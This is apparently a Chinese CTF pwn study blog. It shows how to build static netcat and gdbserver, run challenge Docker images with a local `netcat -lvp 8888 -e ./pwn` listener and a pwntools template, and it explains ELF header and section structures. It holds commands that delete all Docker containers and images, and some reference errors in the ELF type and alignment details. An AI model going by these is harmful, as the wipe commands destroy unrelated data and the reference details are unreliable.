<h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><p>安装：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install patchelf</span><br></pre></td></tr></table></figure></div>
<h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install qemu-user qemu-system </span><br></pre></td></tr></table></figure></div>
<h1 id="如何使用题目提供的-docker-环境"><a href="#如何使用题目提供的-docker-环境" class="headerlink" title="如何使用题目提供的 docker 环境"></a>如何使用题目提供的 docker 环境</h1><h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><p>在<a class="link"   href="https://netcat.sourceforge.net/" >官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载项目源码，使用如下命令进行编译。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./configure LDFLAGS=-static <span class="comment"># 考虑到 docker 环境恶劣选择静态编译</span></span><br><span class="line">make -j24 <span class="comment"># 编译</span></span><br></pre></td></tr></table></figure></div>
<p>编译后生成的 <code>netcat</code> 位于项目 <code>src</code> 目录下。<code>netcat</code> 即我们常用的 <code>nc</code> 命令对应的可执行程序。</p>
<p>在 docker 中使用如下命令将题目 io 映射到 8888 端口。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./netcat -lvp 8888 -e ./pwn</span><br></pre></td></tr></table></figure></div>

<p>在本机可以使用如下命令连接并交互。（前提是 docker 的 8888 端口映射到本机的 8888 端口）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 8888</span><br></pre></td></tr></table></figure></div>
<h2 id="gdb-1"><a href="#gdb-1" class="headerlink" title="gdb"></a>gdb</h2><p>在<a class="link"   href="https://www.sourceware.org/gdb/download/" >官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载项目源码，使用如下命令编译 gdbserver ：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install libgmp-dev libmpfr-dev</span><br><span class="line"><span class="built_in">cd</span> gdb-9.2/gdb/gdbserver</span><br><span class="line">./configure LDFLAGS=-static</span><br><span class="line">make -j $(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure></div>
<p>对于 gdb ，由于编译 gdb 时依赖的静态库需要提前编译，因此想要编译 gdb 最好直接编译整个项目：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> gdb-9.2</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">../configure   LDFLAGS=-static</span><br><span class="line">make -j $(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure></div>

<p>注意以下几点：</p>
<ul>
<li>编译的 <code>gdbserver</code> 版本一定要与本机的 <code>gdb</code> 匹配，不同版本的 <code>gdbserver</code> 通信协议不同。</li>
<li>有的时候在 <code>gdbserver</code> 中运行 <code>./configuer</code> 命令会出现找不到 <code>Makefile</code> 的情况，这时在根目录进行一次编译就好了。</li>
<li>连接失败之后再运行一次编译命令就可能编译成功。</li>
<li><code>gdb</code> 位于 <code>./gdb/gdb</code> 中。</li>
<li><code>gdbserver</code> 位于 <code>./gdbserver/gdbserver</code> 中。</li>
</ul>
<h2 id="docker-1"><a href="#docker-1" class="headerlink" title="docker"></a>docker</h2><ul>
<li>加载镜像  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker load -i 题目附件.tar</span><br></pre></td></tr></table></figure></div></li>
<li>查看现有镜像  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure></div></li>
<li>启动容器  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --privileged -it -w /home/ctf -v ~/Desktop/本机目录:/home/ctf/镜像目录 -p 8888:8888 -p 9999:9999 镜像名 /bin/bash </span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>--privileged</code>：加这个参数才能 <code>gdbserver</code> 附加进程远程调试</li>
<li><code>-v</code>：目录映射，方便传文件。</li>
<li><code>-p</code>：端口映射，开两个端口分别给 <code>netcat</code> 和 <code>gdbserver</code> 用。改用 <code>--net=host</code> 可以映射全部端口。</li>
<li><code>-w</code>：进入 docker 后目录为 <code>/home/ctf</code> 。</li>
</ul>
</li>
<li>查看现有容器   <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure></div></li>
<li>进容器 shell ，即同一个容器再开一个 shell 。  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -it -w /home/ctf 容器ID /bin/bash</span><br></pre></td></tr></table></figure></div></li>
<li>停止所有容器：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div></li>
<li>删除所有容器：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div></li>
<li>删除所有镜像：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><code>exp.py</code> 模板如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8888</span>) <span class="comment"># nc 连接远程程序</span></span><br><span class="line"></span><br><span class="line">gdb.attach(target=(<span class="string">&quot;localhost&quot;</span>, <span class="number">9999</span>), exe=<span class="string">&quot;./pwn&quot;</span>, gdbscript=<span class="string">&quot;&quot;</span>) <span class="comment"># gdb 连接 docker 中的 gdbserver 调试 ./pwn</span></span><br><span class="line"></span><br><span class="line">pause() <span class="comment"># 阻塞脚本直到 gdb 成功连接 gdbserver防止程序跑飞</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">r.sendlineafter(&quot;xxxx&quot;, &quot;xxx&quot;) # 脚本远程交互</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
<ul>
<li>运行脚本前首先在 docker 容器中用 <code>netcat</code> 将题目程序 IO 映射到 8888 端口：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./netcat -lvp 8888 -e ./pwn</span><br></pre></td></tr></table></figure></div></li>
<li>运行脚本，阻塞在 <code>gdb.attach</code> 时脚本已经与远程的 <code>netcat</code> 连接，此时 docker 镜像中已经有 <code>pwn</code> 这个进程了。此时使用 <code>ps -aux | grep pwn</code> 查看进程 <code>pid</code> 然后运行如下命令让 <code>gdbserver</code> 附加进程并监听 9999 端口。  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdbserver :9999 --attach 进程pid</span><br></pre></td></tr></table></figure></div></li>
<li>此时脚本执行 <code>gdb.attach</code> 连接 docker 中的 <code>gdbserver</code> 并阻塞在 <code>pause()</code> 上直到 <code>gdb</code> 成功连接 <code>gdbserver</code> 。</li>
<li>在脚本运行窗口按回车解除阻塞进行调试。</li>
</ul>
<p>其中 docker 中的操作可以通过脚本自动化实现。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">IMAGE_NAME=minipy-debug</span><br><span class="line">CONTAINER_HOME=/home/ctf</span><br><span class="line">PROG_NAME=minipy</span><br><span class="line">NC_PORT=8888</span><br><span class="line">DBG_PORT=9999</span><br><span class="line"></span><br><span class="line"><span class="comment"># load image</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(docker images | grep $&#123;IMAGE_NAME&#125; | wc -l)</span>&quot;</span> -lt <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    docker load -i <span class="variable">$&#123;IMAGE_NAME&#125;</span>.tar</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start continer</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(docker ps | grep $&#123;IMAGE_NAME&#125; | wc -l)</span>&quot;</span> -lt <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="comment">#   docker run --privileged -itd -p $&#123;DBG_PORT&#125;:$&#123;DBG_PORT&#125; -p $&#123;NC_PORT&#125;:$&#123;NC_PORT&#125; $&#123;IMAGE_NAME&#125;</span></span><br><span class="line">    docker run --privileged -itd --net=host <span class="variable">$&#123;IMAGE_NAME&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get continer id</span></span><br><span class="line">CONTAINER_ID=$(docker ps -q --filter <span class="string">&quot;ancestor=<span class="variable">$&#123;IMAGE_NAME&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cp files</span></span><br><span class="line">docker <span class="built_in">cp</span> ./tools/gdbserver <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line">docker <span class="built_in">cp</span> ./tools/netcat <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line">docker <span class="built_in">cp</span> ./<span class="variable">$&#123;PROG_NAME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start run</span></span><br><span class="line">docker <span class="built_in">exec</span> -itd -w <span class="variable">$&#123;CONTAINER_HOME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span> /bin/bash -c <span class="string">&quot;./netcat -lvp <span class="variable">$&#123;NC_PORT&#125;</span> -e ./<span class="variable">$&#123;PROG_NAME&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">read</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it -w <span class="variable">$&#123;CONTAINER_HOME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span> /bin/bash -c <span class="string">&quot;ps -ef | grep <span class="variable">$&#123;PROG_NAME&#125;</span> | grep -v &#x27;grep&#x27; | grep -v &#x27;\-c&#x27; | awk &#x27;&#123;print \$2&#125;&#x27; | xargs ./gdbserver :<span class="variable">$&#123;DBG_PORT&#125;</span> --attach&quot;</span></span><br><span class="line"><span class="built_in">read</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#docker stop $&#123;CONTAINER_ID&#125;</span></span><br><span class="line"><span class="comment">#docker rm $&#123;CONTAINER_ID&#125;</span></span><br><span class="line"></span><br><span class="line">docker stop $(docker ps -a -q)</span><br><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div>
<h1 id="ELF-文件格式"><a href="#ELF-文件格式" class="headerlink" title="ELF 文件格式"></a>ELF 文件格式</h1><p>ELF（Executable and Linkable Format）是一种常见的可执行文件和可链接文件格式，主要用于Linux和类Unix系统。ELF 文件可以包含不同的类型，常见的 ELF 文件类型包括：</p>
<ul>
<li>可执行文件（<code>ET_EXEC</code>）：这种类型的 ELF 文件是可直接执行的程序，可以在操作系统上运行。</li>
<li>共享目标文件（<code>ET_DYN</code>）：这种类型的 ELF 文件是可被动态链接的共享库，可以在运行时与其他程序动态链接。该类型文件后缀名为 <code>.so</code> 。</li>
<li>可重定位文件（<code>ET_REL</code>）：这种类型的 ELF 文件是编译器生成的目标文件，通常用于将多个目标文件链接到一个可执行文件或共享库中。该类型文件后缀名为 <code>.o</code> ，静态链接库（<code>.a</code>）也可以归为这一类。</li>
<li>核心转储文件（<code>ET_CORE</code>）：这种类型的 ELF 文件是操作系统在程序崩溃或发生错误时生成的核心转储文件，用于调试和分析程序崩溃的原因。</li>
</ul>
<p>ELF 文件结构及相关常数被定义在 <code>/usr/include/elf.h</code> 里，因为 ELF 文件在各种平台下都通用，ELF文件有 32 位版本和 64 位版本。32 位版本与 64 位版本的 ELF 文件的格式基本是一样的（部分结构体为了优化对齐后大小调整了成员的顺序），只不过有些成员的大小不一样。</p>
<p><code>elf.h</code> 使用 typedef 定义了一套自己的变量体系：</p>
<table>
<thead>
<tr>
<th>自定义类型</th>
<th>描述</th>
<th>原始类型</th>
<th>长度（字节）</th>
</tr>
</thead>
<tbody><tr>
<td><code>Elf32_Addr</code></td>
<td>32 位版本程序地址</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf32_Half</code></td>
<td>32 位版本的无符号短整型</td>
<td><code>uint16_t</code></td>
<td>2</td>
</tr>
<tr>
<td><code>Elf32_Off</code></td>
<td>32 位版本的偏移地址</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf32_Sword</code></td>
<td>32 位版本有符号整型</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf32_Word</code></td>
<td>32 位版本无符号整型</td>
<td><code>int32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf64_Addr</code></td>
<td>64 位版本程序地址</td>
<td><code>uint64_t</code></td>
<td>8</td>
</tr>
<tr>
<td><code>Elf64_Half</code></td>
<td>64 位版本的无符号短整型</td>
<td><code>uint16_t</code></td>
<td>2</td>
</tr>
<tr>
<td><code>Elf64_Off</code></td>
<td>64 位版本的偏移地址</td>
<td><code>uint64_t</code></td>
<td>8</td>
</tr>
<tr>
<td><code>Elf64_Sword</code></td>
<td>64 位版本有符号整型</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf64_Word</code></td>
<td>64 位版本无符号整型</td>
<td><code>int32_t</code></td>
<td>4</td>
</tr>
</tbody></table>
<p>ELF 主要管理结构为文件头，程序头表（可重定位文件没有）和节表，其他部分有一个个节组成，多个属性相同的节构成一个段。对于节的介绍这里按照静态链接相关和动态链接相关分别介绍。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108001735862.png"
                      alt="image-20241108001735862" style="zoom:33%;" 
                >

<h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><p>我们这里以 32 位版本的文件头结构 <code>Elf32_Ehdr</code> 作为例子来描述，它的定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The ELF file header.  This appears at the start of every ELF file.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT (16)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	e_ident[EI_NIDENT];	<span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half	e_type;			<span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half	e_machine;		<span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word	e_version;		<span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr	e_entry;		<span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off	e_phoff;		<span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off	e_shoff;		<span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word	e_flags;		<span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half	e_ehsize;		<span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half	e_phentsize;		<span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half	e_phnum;		<span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half	e_shentsize;		<span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half	e_shnum;		<span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half	e_shstrndx;		<span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>e_ident</code>：ELF 文件的魔数和其他信息。</strong><ul>
<li>前 4 字节为 <code>ELFMAG</code> 即 <code>\x7fELF</code> 。</li>
<li>第 5 字节为 ELF 文件类型，值为 <code>ELFCLASS32(1)</code> 代表 32 位，值为 <code>ELFCLASS64(2)</code> 代表 64 位。 </li>
<li>第 6 字节为 ELF 的字节序，0 为无效格式，1 为小端格式，2 为大端格式。</li>
<li>第 7 字节为 ELF 版本，一般为 1 ，即 1.2 版本。</li>
<li>后面 9 字节没有定义一般填 0 ，有些平台会使用这 9 个字节作为扩展标志。</li>
</ul>
</li>
<li><strong><code>e_type</code>：表示ELF文件类型，如可执行文件、共享对象文件（<code>.so</code>）、可重定位文件（<code>.o</code>）等。</strong></li>
<li><code>e_machine</code>：表示目标体系结构，即程序的目标平台，如 x86、ARM 等。相关常量以 <code>EM_</code> 开头。</li>
<li><code>e_version</code>：ELF 文件版本号，一般为常数 1 。</li>
<li><strong><code>e_entry</code>：表示程序入口点虚拟地址。操作系统加载完程序后从这个地址开始执行进程的命令。可重定位文件一般没有入口地址，则这个值为 0 。</strong></li>
<li><strong><code>e_phoff</code>：表示程序头表的文件偏移量。</strong></li>
<li><strong><code>e_shoff</code>：表示节表的文件偏移量。</strong></li>
<li><code>e_flags</code>：表示处理器特定标志。</li>
<li><strong><code>e_ehsize</code>：表示 ELF 文件头的大小。</strong></li>
<li><strong><code>e_phentsize</code>：表示程序头表中每个表项的大小。</strong></li>
<li><strong><code>e_phnum</code>：表示程序头表中表项的数量。</strong></li>
<li><strong><code>e_shentsize</code>：表示节表中每个表项的大小。</strong></li>
<li><strong><code>e_shnum</code>：表示节表中表项的数量。</strong></li>
<li><code>e_shstrndx</code>：<strong>表示节表中字符串表的索引。</strong></li>
</ul>
<h2 id="程序头表"><a href="#程序头表" class="headerlink" title="程序头表"></a>程序头表</h2><p>ELF 可执行文件中有一个专门的数据结构叫做程序头表（Program Header Table）用来保存<strong>段</strong>（<strong>注意不是节</strong>）的信息。因为 ELF <strong>目标文件</strong>不需要被装载，所以它没有程序头表，而 ELF 的<strong>可执行文件</strong>和<strong>共享库文件</strong>都有程序头表。</p>
<p>程序头表是由 <code>Elf*_Phdr</code> 组成的数组，用于描述 ELF 文件中每个节的属性和信息。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Program segment header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	p_type;			<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf32_Off	p_offset;		<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf32_Addr	p_vaddr;		<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf32_Addr	p_paddr;		<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf32_Word	p_filesz;		<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf32_Word	p_memsz;		<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf32_Word	p_flags;		<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf32_Word	p_align;		<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>p_type</code>：段的类型，例如可执行段、数据段等。</li>
<li><code>p_offset</code>：段在文件中的偏移量。</li>
<li><code>p_vaddr</code>：段在虚拟内存中的起始地址。</li>
<li><code>p_paddr</code>：段在物理内存中的起始地址。因为 ELF 还没装载不知道物理地址，所以作为保留字段。通常和 <code>p_vaddr</code> 的值是一样的。</li>
<li><code>p_filesz</code>：段在文件中的大小。</li>
<li><code>p_memsz</code>：段在内存中的大小。</li>
<li><code>p_flags</code>：段的标志，例如可读、可写、可执行等。</li>
<li><code>p_align</code>：段在文件和内存中的对齐方式。段的的加载地址要能被 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mtext>p_align</mtext></msup></mrow><annotation encoding="application/x-tex">2^{\text{p\_align}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">p_align</span></span></span></span></span></span></span></span></span></span></span></span></span> 整除。</li>
</ul>
<h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><p>ELF文件里面定义一个固定长度的 <code>Elf*_Shdr</code> 结构体数组用来存放<strong>节</strong>相关信息，与 PE 文件的节表相似。</p>
<blockquote>
<p>在 ELF 文件中，<strong>段</strong>（Segment）和<strong>节</strong>（Section）是两个不同的概念，它们在文件结构中具有不同的作用和目的。<br><br>段（Segment）是一种逻辑上的组织单位，它定义了可执行文件或共享库在内存中的一个连续区域。每个段都有自己的虚拟地址空间，可以包含多个节。常见的段类型包括代码段（<code>.text</code>），数据段（<code>.data</code>、<code>.bss</code>），只读数据段（<code>.rodata</code>）等。段在加载和执行时被操作系统用来管理内存，设置内存保护属性以及指定虚拟地址空间的起始地址和大小。<br><br>节（Section）是一种更细粒度的组织单位，它包含了文件中的特定类型的数据或代码。每个节都有自己的名字、类型和内容。常见的节类型包括代码节（<code>.text</code>），数据节（<code>.data</code>、<code>.bss</code>），只读数据节（<code>.rodata</code>），符号表节（<code>.symtab</code>），字符串表节（<code>.strtab</code>）等。节不直接参与内存的加载和执行，而是用于链接器（Linker）和调试器（Debugger）等工具对文件进行处理和分析。<br><br><strong>通俗的讲，在装载程序的时候为了节省内存会将 ELF 文件中属性相同的节（Section）合并成在一个段（Segment）加载到内存中。</strong><br><br>段和节之间存在对应关系和映射关系：</p>
<ul>
<li>一个段可以包含多个节，这些节的内容和属性都属于该段。</li>
<li>段提供了对应于虚拟内存的逻辑映射，而节则提供了对应于文件的逻辑映射。</li>
<li>段的加载和执行涉及内存管理和地址映射，而节则用于链接和调试过程中的符号解析、重定位等操作。</li>
</ul>
</blockquote>
<p>其中 <code>Elf32_Shdr</code> 定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Section header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	sh_name;		<span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Word	sh_type;		<span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Word	sh_flags;		<span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addr	sh_addr;		<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Off	sh_offset;		<span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Word	sh_size;		<span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Word	sh_link;		<span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word	sh_info;		<span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word	sh_addralign;		<span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Word	sh_entsize;		<span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>sh_name</code>：表示节的名称在字符串表中的索引。字符串表节存储了所有节的名称，<code>sh_name</code> 指定了节的名称在字符串表中的位置。</strong></li>
<li><strong><code>sh_type</code>：表示节的类型，指定了节的用途和属性。常见的类型包括代码段（<code>SHT_PROGBITS(1)</code>）、数据段（<code>SHT_PROGBITS(1)</code>）、符号表（<code>SHT_SYMTAB(2)</code>）、字符串表（<code>SHT_STRTAB(3)</code>）等。</strong></li>
<li><code>sh_flags</code>：表示节的标志，用于描述节的特性和属性。标志的具体含义取决于节的类型和上下文。</li>
<li><strong><code>sh_addr</code>：表示节的虚拟地址，只在可执行文件中有意义。对于可执行文件，<code>sh_addr</code> 指定了节在内存中的加载地址，如果该节不可被加载，则该值为 0 。</strong></li>
<li><strong><code>sh_offset</code>：表示节在文件中的偏移量，指定了节在文件中的位置。对于 bss 段来说该值没有意义。</strong></li>
<li><strong><code>sh_size</code>：表示节的大小，指定了节所占据的字节数。</strong></li>
<li><code>sh_link</code>：表示链接到的其他节的索引，用于建立节之间的关联关系，具体含义依赖于节的类型。</li>
<li><code>sh_info</code>：附加信息，具体含义依赖于节的类型。</li>
<li><code>sh_addralign</code>：表示节的地址对齐要求，指定了节在内存中的对齐方式。即 <code>sh_addr</code> 需要满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>sh_addr</mtext><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><msup><mn>2</mn><mtext>sh_addralign</mtext></msup><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\text{sh\_addr} \mod 2^{\text{sh\_addralign}} = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">sh_addr</span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">sh_addralign</span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 。如果 <code>sh_addralign</code> 为 0 或 1 表示该段没有对齐要求。</li>
<li><strong><code>sh_entsize</code>：表示节中每个项的大小，如果该字段为 0 说明节中不包含固定大小的项。</strong></li>
</ul>
<p>ELF 中常见的节如下：</p>
<ul>
<li><code>.text</code>：代码段（Code Section），用于存储程序的可执行指令。</li>
<li><code>.rodata</code>：只读数据段（Read-Only Data Section），用于存储只读的常量数据，例如字符串常量。</li>
<li><code>.data</code>：数据段（Data Section），用于存储已初始化的全局变量和静态变量。</li>
<li><code>.bss</code>：未初始化的数据段（Block Started by Symbol），用于存储未初始化的全局变量和静态变量。它不占用实际的文件空间，而是在运行时由系统自动初始化为零。</li>
<li><code>.symtab</code>：符号表节（Symbol Table Section），用于存储程序的符号表信息，包括函数、变量和其他符号的名称、类型和地址等。</li>
<li><code>.strtab</code>：字符串表节（String Table Section），用于存储字符串数据，如节名称、符号名称等。字符串表节被多个其他节引用，通过偏移量和索引来访问具体的字符串。</li>
<li><code>.rel.text</code> 或 <code>.rela.text</code>：代码重定位节（Relocation Section），用于存储代码段中的重定位信息，以便在链接时修正代码中的符号引用。</li>
<li><code>.rel.data</code> 或 <code>.rela.data</code>：数据重定位节（Relocation Section），用于存储数据段中的重定位信息，以便在链接时修正数据段中的符号引用。</li>
<li><code>.dynamic</code>：动态节（Dynamic Section），用于存储程序的动态链接信息，包括动态链接器需要的重定位表、共享对象的名称、版本信息等。</li>
<li><code>.note</code>：注释节（Note Section），用于存储与程序或库相关的注释或调试信息。</li>
</ul>
